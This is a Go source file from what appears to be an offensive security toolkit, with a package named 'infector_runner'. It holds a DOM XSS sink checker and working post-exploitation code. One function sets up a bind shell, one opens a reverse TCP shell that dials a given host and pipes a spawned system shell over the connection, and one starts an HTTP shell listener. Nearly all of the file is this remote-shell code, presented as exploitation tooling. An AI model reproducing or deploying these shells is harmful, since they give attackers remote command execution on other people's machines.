package infector_runner

import (
	"fmt"
	c "main/modg/colors"
	httprequeests "main/modg/requests"
	web3point0 "main/modg/scripts/web"
	tcpmessages "main/modules/tcp"
	"net"
	"net/http"
	"os/exec"
)

func Check_DOMXSS(target []string) {
	results := web3point0.Find(httprequeests.Remove_URL_vals(target))
	for _, k := range results {
		fmt.Println("<RR6> Sink-> Got sink on url ", k.Url)
		fmt.Printf("<RR6> Sink->  < %s > \n", k.Result_Sink)
	}
}

// attempt to pop a bind shell
func Load_Bind_shell_NOREVERSE(host, port string) {
	l, x := net.Listen("tcp", net.JoinHostPort(host, port))
	if x != nil {
		fmt.Println(c.REDHB, "<RR6> TCP NetSOCK -> WEB -> POST EXPL: Got error when trying to load and run bind shell -> ", x)
	} else {
		fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information   \t: Listening on port     -> %s", port)
		fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information   \t: Listening on host     -> %s", host)
		fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information   \t: Listening on hostname -> %s", net.JoinHostPort(host, port))
		for {
			n, x := l.Accept()
			if x != nil {
				fmt.Println(c.REDHB, "<RR6> SOCK MOD -> WEB -> POST EXPL: Got error when trying to accept the connection -> ", x)
			} else {
				fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information   \t: Got a good connection, running shell... %s", net.JoinHostPort(host, port))
				go web3point0.POP_Shell(n)
			}
		}
	}
}

// attempt to pop a reverse bind shell
func Load_Reverse_TCP_Shell(host, port string) {
	fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information  \t: Running TCP Dial on host      |%s\n", host)
	fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information  \t: Running TCP Dial on port      |%s\n", port)
	fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information  \t: Running TCP Dial on hostname  |%s\n", net.JoinHostPort(host, port))
	l, x := net.Dial(tcpmessages.Method_1, net.JoinHostPort(host, port))
	if x != nil {
		fmt.Println(c.REDHB, "<RR6> TCP SOCK -> WEB_3.0 -> POST EXPL: Got error when trying to dial the hostname -> ", x)
	} else {
		fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information  \t: Got a good connection on host |%s\n", net.JoinHostPort(host, port))
		fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information  \t: Attempting to get a shell on  |%s\n", net.JoinHostPort(host, port))
		exec := exec.Command(tcpmessages.Shell)
		fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information  \t: Spawned a shell               |\n")
		exec.Stdin = l
		exec.Stdout = l
		exec.Stderr = l
		exec.Run()
	}
}

// attempt to load tcp bind http shell
func Load_HTTP_Shell(host, port string) {
	http.HandleFunc("/", web3point0.POP_Shell_HTTP)
	fmt.Println("[*] Listening for information!...")
	x := http.ListenAndServe(net.JoinHostPort(host, port), nil)
	if x != nil {
		fmt.Println(c.REDHB, "<RR6> Got error when trying to run the listener -> ", x)
	}
}
